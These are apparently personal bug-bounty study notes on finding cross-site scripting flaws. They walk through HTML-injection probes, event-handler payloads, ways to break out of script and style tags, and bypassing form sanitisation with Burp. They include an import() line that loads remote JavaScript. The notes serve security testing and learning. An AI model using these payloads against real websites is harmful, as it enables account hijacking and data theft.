
`<script>alert("Succ3ssful XSS")</script>`

---

cross site scripting

insert javascript code into a website

stored or not, reflected or not



try html injection first - `"><u>test123"` /nahamsec

then try an event handler `<u/onmouseover=alert(1)>test123`
`<img src=x onerror=alert(1)>`

confirm

get your code in here `import('http://site.com/1.js')`

can put xss payload or blind xss payload

---

go through a web page, clicking everything to check what pages exist and what parameters exist, what fields exist..

#### Parameters
try payloads for parameters
url/?page_id=2test123 - is test123 on the page?
view page source or inspect, search for test123
	might end up in html, might be in html...
	if you're in a script tag, just close it: `"></script>test123`
	or for example `?param=2test123"></script>test123<img%20src=x%20onerror=alert();//>`
	or simply `?param=2%27;+alert()//test123`
	check for other empty variables in javascript code and try them as parameters

#### Fields
blog title: Welcome`"><U>test123`
colors for style
even if it is sanitized when entering into the form we can modify the request by capturing it with burp...
if we add a `</style>test123<script>alert()</script>`




